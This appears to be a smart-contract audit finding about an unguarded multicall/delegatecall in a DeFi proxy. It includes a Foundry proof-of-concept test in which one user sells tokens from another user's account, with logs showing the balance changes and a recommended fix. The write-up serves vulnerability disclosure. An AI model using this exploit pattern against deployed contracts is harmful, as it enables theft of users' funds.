# Multicall allows anyone to transaction on other user's balances.

## Summary
Multi call is a delegate Call that is not properly guarded and opens a huge vulnerability letting any one perform transaction on others account via this contract. 

## Vulnerability Detail
Using multicall, any one can call any function exposed on this contract on some one else behalf which is a huge vulnerability.

**Below is the POC to demonstrate the vulnerability.**

```solidity
 function testPreformOnOtherUserAccount() public {
        makerDepositETH();

        uint256 beforeBalance2 = user1.balance;
        uint256 beforeBalance3 = token3.balanceOf(user1);
        console2.log("user1 Eth balance:", beforeBalance2);
        console2.log("user1 Token balance:", beforeBalance3);

        // construct swap bytes data
        SwapCallbackData memory swapData;
        swapData.data = "";
        swapData.payer = user1;

        bytes memory swapDataBytes = abi.encodeWithSignature(
            "sellTokens("
            "address,"
            "address,"
            "address,"
            "address,"
            "uint256,"
            "uint256,"
            "bytes,"
            "uint256"
            ")", 
            address(d3MM),
            user1,
            address(token3), 
            _ETH_ADDRESS_, 
            12 ether, 
            0, 
            abi.encode(swapData),
            block.timestamp + 1000
        );

        // construct multicall data
        bytes[] memory mulData = new bytes[](1);
        mulData[0] = swapDataBytes;
 ```
Note how in the below calls, the caller is user3, but, he is calling multicall for user 1 and update the user 1's balances.
**User 3 is operating on User 1's account**
```solidity     
        vm.startPrank(user3);
        d3Proxy.multicall(mulData);
        vm.stopPrank();
```
Note how user3 was able to successfully update the ether balance and Token3 balance of user1.
```solidity
        uint256 afterBalance2 = user1.balance;
        uint256 afterBalance3 = token3.balanceOf(user1);

        console2.log("user 1 eth:", afterBalance2 - beforeBalance2);
        console2.log("user 1 token:",beforeBalance3 - afterBalance3 );
    }
```

**Foundry Logs:**

Logs:
  user1 Eth balance: 3000000000000000000
  user1 Token balance: 500000000000000000000
  user 1 eth: 996775265755655500
  user 1 token: 12000000000000000000

## Impact
Loss of funds, lack of access control as any one could operate on other's account with this vulnerability and transact on this behalf.

## Code Snippet

The below implementation of delegatecall can be very dangerous as it opens up the contract and storage for anyone to operate on it.

```solidity

function multicall(bytes[] calldata data) public payable returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            (bool success, bytes memory result) = address(this).delegatecall(data[i]);

            if (!success) {
                assembly {
                    revert(add(result, 32), mload(result))
                }
            }

            results[i] = result;
        }
    }
```

## Tool used

Manual Review

## Recommendation
implement restriction on how the mulitcall can be made, implement logic using modifiers to limit on whose account such calls can be made.
